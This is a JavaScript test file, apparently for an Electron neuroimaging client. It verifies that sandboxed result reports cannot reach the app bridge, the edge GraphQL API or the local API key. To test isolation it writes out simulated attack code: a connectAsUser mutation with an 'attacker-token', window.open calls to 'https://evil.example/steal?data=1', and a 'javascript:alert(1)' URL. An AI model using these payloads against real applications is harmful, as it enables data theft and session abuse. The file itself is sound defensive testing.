/* global document, window, fetch, WebSocket */
import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import test from 'node:test'
import { _electron as electron } from '@playwright/test'
import { build } from 'esbuild'
import { setConfig } from 'edge-federated-client/dist/config/config.js'
import { start } from 'edge-federated-client/dist/api/index.js'
import { createEdgeLocalApiKey } from '../../build/edgeLocalApiKey.js'
import { decideWindowOpen, isAllowedNavigation, isEdgeResultsUrl } from '../../build/windowPolicy.js'

const consortiumId = 'a'.repeat(24)
const runId = 'b'.repeat(24)
const participantId = 'c'.repeat(24)

const listen = (server) => new Promise((resolve, reject) => {
  server.once('error', reject)
  server.listen(0, '127.0.0.1', () => resolve(server.address().port))
})

// Runs inside a report (or results window) and tries to reach privileged surfaces.
const attack = async ({ edge, run }) => {
  const status = async (promise) => { try { return (await promise).status } catch { return 'blocked' } }
  const socket = await new Promise((resolve) => {
    const ws = new WebSocket(`${edge.replace('http', 'ws')}/graphql`, 'graphql-transport-ws')
    ws.onopen = () => { ws.close(); resolve('open') }
    ws.onerror = () => resolve('error')
  })
  return {
    bridge: typeof window.ElectronAPI,
    connectAsUser: await status(fetch(`${edge}/graphql`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-access-token': 'attacker-token' },
      body: JSON.stringify({ query: 'mutation { connectAsUser }' }),
    })),
    socket,
    result: await (await fetch(`${run}/summary.txt`)).text(),
  }
}

test('a results URL without a subpath scopes to nothing rather than the whole edge origin', () => {
  const run = 'http://localhost:3003/run-results/a/b/c/report.html'
  assert.equal(isEdgeResultsUrl('http://localhost:3003/run-results', run), true)
  assert.equal(isEdgeResultsUrl('http://localhost:3003/run-results/', run), true)
  assert.equal(isEdgeResultsUrl('http://localhost:3003/run-results', 'http://localhost:3003/graphql'), false)
  for (const rootBase of ['http://localhost:3003', 'http://localhost:3003/', 'http://localhost:3003//']) {
    assert.equal(isEdgeResultsUrl(rootBase, run), false, rootBase)
    assert.equal(isEdgeResultsUrl(rootBase, 'http://localhost:3003/graphql'), false, rootBase)
    assert.deepEqual(decideWindowOpen(run, rootBase), { action: 'deny' }, rootBase)
    assert.equal(isAllowedNavigation('http://localhost:3003/graphql', { edgeResultsUrl: rootBase }), false)
  }
})

test('result reports cannot reach the app bridge, the edge API or app navigation',
  { timeout: 90000 }, async () => {
    const base = await mkdtemp(path.join(tmpdir(), 'nf-report-isolation-'))
    const results = path.join(base, consortiumId, runId, participantId, 'results')
    await mkdir(results, { recursive: true })
    await writeFile(path.join(results, 'summary.txt'), 'public result')
    await writeFile(path.join(results, 'brain.nii.gz'), 'nifti')
    await writeFile(path.join(results, 'report.html'), '<html><head></head><body><p id=title>Report</p></body></html>')
    await writeFile(path.join(results, 'second.html'), '<html><head></head><body><p id=second>Second</p></body></html>')

    const auth = createServer((request, response) => {
      response.setHeader('content-type', 'application/json')
      response.end(JSON.stringify({ decodedAccessToken: { userId: participantId, roles: ['user'] } }))
    })
    const localApiKey = createEdgeLocalApiKey()
    let edgeServer, instance, appServer
    try {
      const authPort = await listen(auth)
      setConfig({
        httpUrl: 'http://127.0.0.1:9/graphql',
        wsUrl: 'ws://127.0.0.1:9/graphql',
        pathBaseDirectory: base,
        authenticationEndpoint: `http://127.0.0.1:${authPort}/`,
        hostingPort: 0,
        localApiKey,
      })
      edgeServer = await start({ port: 0, localApiKey })
      const edge = `http://localhost:${edgeServer.address().port}`
      const run = `${edge}/run-results/${consortiumId}/${runId}/${participantId}`

      const bundle = await build({
        stdin: {
          contents: `import React from 'react';
            import {createRoot} from 'react-dom/client';
            import {AppThemeProvider} from './src/theme/AppThemeProvider';
            import ResultReportViewer from './src/pages/RunResults/ResultReportViewer';
            createRoot(document.getElementById('root')).render(
              <AppThemeProvider><ResultReportViewer src='${run}/report.html' /></AppThemeProvider>);`,
          loader: 'tsx',
          resolveDir: fileURLToPath(new URL('../../../reactApp', import.meta.url)),
        },
        bundle: true,
        write: false,
        jsx: 'automatic',
        define: { 'process.env.NODE_ENV': '"production"' },
      })
      appServer = createServer((request, response) => {
        response.setHeader('content-type', request.url === '/app.js' ? 'text/javascript' : 'text/html')
        response.end(request.url === '/app.js' ? bundle.outputFiles[0].text
          : '<!doctype html><title>App</title><div id=root></div><script src=/app.js></script>')
      })
      const appUrl = `http://127.0.0.1:${await listen(appServer)}/`

      instance = await electron.launch({
        args: [
          fileURLToPath(new URL('../fixtures/reportIsolation.mjs', import.meta.url)),
          `--fixture-base=${base}`, `--edge-url=${edge}`,
          `--local-api-key=${localApiKey}`, `--app-url=${appUrl}`,
        ],
        env: { ...process.env, NODE_ENV: 'test' },
      })
      const appWindow = await instance.firstWindow()
      appWindow.setDefaultTimeout(10000)
      await appWindow.waitForFunction(() => document.querySelector('iframe'))
      assert.equal(
        await appWindow.locator('iframe').getAttribute('sandbox'),
        'allow-scripts allow-same-origin allow-popups allow-downloads',
      )
      await appWindow.frameLocator('iframe').locator('#title').waitFor()
      const report = appWindow.frames().find((frame) => frame.url().endsWith('/report.html'))

      // The app itself keeps full access.
      const appAccess = await appWindow.evaluate(async ({ edge }) => {
        const response = await fetch(`${edge}/graphql`, {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'x-access-token': 'user-token' },
          body: JSON.stringify({ query: '{ __typename }' }),
        })
        return { bridge: window.ElectronAPI?.canary, graphql: response.status }
      }, { edge })
      assert.deepEqual(appAccess, { bridge: true, graphql: 200 })

      assert.deepEqual(await report.evaluate(attack, { edge, run }), {
        bridge: 'undefined', connectAsUser: 403, socket: 'error', result: 'public result',
      })

      // Top-level navigation is blocked by the sandbox; the app stays on its own page.
      await report.evaluate(() => {
        try { window.top.location.href = 'https://evil.example/' } catch { /* expected */ }
      })
      await report.evaluate(({ run, appUrl }) => {
        window.open('https://evil.example/steal?data=1')
        window.open(`/nii-viewer?url=${encodeURIComponent(`${run}/brain.nii.gz`)}`)
        window.open('/nii-viewer?url=https%3A%2F%2Fevil.example%2Fx.nii')
        window.open(appUrl)
        window.open('javascript:alert(1)')
      }, { run, appUrl })
      await new Promise((resolve) => setTimeout(resolve, 500))
      assert.equal(appWindow.url(), appUrl)
      assert.equal(instance.windows().length, 1)
      assert.deepEqual(await instance.evaluate(() => globalThis.externalRequests), ['https://evil.example/steal?data=1'])
      assert.deepEqual(await instance.evaluate(() => globalThis.niftiRequests), [`${run}/brain.nii.gz`])

      // Result links open in a separate window that has no bridge and no edge API access.
      const [resultsWindow] = await Promise.all([
        instance.waitForEvent('window'),
        report.evaluate(({ run }) => { window.open(`${run}/second.html`) }, { run }),
      ])
      await resultsWindow.locator('#second').waitFor()
      assert.deepEqual(await resultsWindow.evaluate(attack, { edge, run }), {
        bridge: 'undefined', connectAsUser: 403, socket: 'error', result: 'public result',
      })
      await resultsWindow.evaluate(({ appUrl }) => { window.location.href = appUrl }, { appUrl })
      await new Promise((resolve) => setTimeout(resolve, 500))
      assert.ok(resultsWindow.url().endsWith('/second.html'))
    } finally {
      await instance?.close()
      edgeServer?.closeAllConnections()
      await new Promise((resolve) => edgeServer ? edgeServer.close(resolve) : resolve())
      const servers = [auth, appServer].filter(Boolean)
      await Promise.all(servers.map((server) => new Promise((resolve) => server.close(resolve))))
      await rm(base, { recursive: true, force: true })
    }
  })

// 1x1 transparent PNG.
const pixel = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
  'base64',
)

test('the app session sends the edge key to the edge client only, from every request type',
  { timeout: 60000 }, async () => {
    const base = await mkdtemp(path.join(tmpdir(), 'nf-edge-key-'))
    const results = path.join(base, consortiumId, runId, participantId, 'results')
    await mkdir(results, { recursive: true })
    await writeFile(path.join(results, 'summary.txt'), 'public result')
    await writeFile(path.join(results, 'pixel.png'), pixel)
    await writeFile(path.join(results, 'report.html'),
      '<html><head></head><body><p id=title>Report</p><img id=pixel src="pixel.png"></body></html>')

    const otherHeaders = []
    const other = createServer((request, response) => {
      otherHeaders.push(request.headers)
      response.setHeader('access-control-allow-origin', '*')
      response.end('other')
    })
    const auth = createServer((request, response) => {
      response.setHeader('content-type', 'application/json')
      response.end(JSON.stringify({ decodedAccessToken: { userId: participantId, roles: ['user'] } }))
    })
    const page = createServer((request, response) => {
      response.setHeader('content-type', 'text/html')
      response.end('<!doctype html><title>App</title>')
    })
    const localApiKey = createEdgeLocalApiKey()
    let edgeServer, instance
    try {
      const [otherPort, authPort, pagePort] = await Promise.all([listen(other), listen(auth), listen(page)])
      setConfig({
        httpUrl: 'http://127.0.0.1:9/graphql',
        wsUrl: 'ws://127.0.0.1:9/graphql',
        pathBaseDirectory: base,
        authenticationEndpoint: `http://127.0.0.1:${authPort}/`,
        hostingPort: 0,
        localApiKey,
      })
      edgeServer = await start({ port: 0, localApiKey })
      // The renderer addresses the edge as "localhost", as the shipped config does.
      const edge = `http://localhost:${edgeServer.address().port}`
      const resultsUrl = `${edge}/run-results/${consortiumId}/${runId}/${participantId}`

      assert.equal((await fetch(`${resultsUrl}/summary.txt`)).status, 403)

      instance = await electron.launch({
        args: [
          fileURLToPath(new URL('../fixtures/edgeLocalApiKey.mjs', import.meta.url)),
          `--fixture-base=${base}`,
          `--edge-url=${edge}`,
          `--local-api-key=${localApiKey}`,
          `--page-url=http://127.0.0.1:${pagePort}/`,
        ],
        env: { ...process.env, NODE_ENV: 'test' },
      })
      const window = await instance.firstWindow()
      window.setDefaultTimeout(10000)

      const outcome = await window.evaluate(async ({ resultsUrl, edge, otherUrl, consortiumId }) => {
        const text = await (await fetch(`${resultsUrl}/summary.txt`)).text()
        const graphql = await fetch(`${edge}/graphql`, {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'x-access-token': 'user-token' },
          body: JSON.stringify({ query: `{ getMountDir(consortiumId: "${consortiumId}") }` }),
        })
        const graphqlStatus = graphql.status
        const graphqlBody = await graphql.json()
        const socket = await new Promise((resolve) => {
          const ws = new WebSocket(`${edge.replace('http', 'ws')}/graphql`, 'graphql-transport-ws')
          ws.onopen = () => { ws.close(); resolve('open') }
          ws.onerror = () => resolve('error')
        })
        await fetch(otherUrl)
        const frame = document.createElement('iframe')
        frame.src = `${resultsUrl}/report.html`
        document.body.append(frame)
        await new Promise((resolve) => { frame.onload = resolve })
        return { text, graphqlStatus, graphqlBody, socket }
      }, { resultsUrl, edge, otherUrl: `http://127.0.0.1:${otherPort}/`, consortiumId })

      assert.equal(outcome.text, 'public result')
      assert.equal(outcome.graphqlStatus, 200)
      // Reaching the resolver proves the preflighted request carried the key.
      assert.match(outcome.graphqlBody.errors[0].message, /Failed to read mount directory/)
      assert.equal(outcome.socket, 'open')

      const report = window.frames().find((frame) => frame.url().endsWith('/report.html'))
      assert.equal(await report.locator('#title').textContent(), 'Report')
      await report.waitForFunction(() => document.getElementById('pixel').complete)
      assert.equal(await report.evaluate(() => document.getElementById('pixel').naturalWidth), 1)

      assert.equal(otherHeaders.length, 1)
      assert.ok(!('x-neuroflame-local-key' in otherHeaders[0]))
    } finally {
      await instance?.close()
      edgeServer?.closeAllConnections()
      await new Promise((resolve) => edgeServer ? edgeServer.close(resolve) : resolve())
      await Promise.all([other, auth, page].map((server) => new Promise((resolve) => server.close(resolve))))
      await rm(base, { recursive: true, force: true })
    }
  })
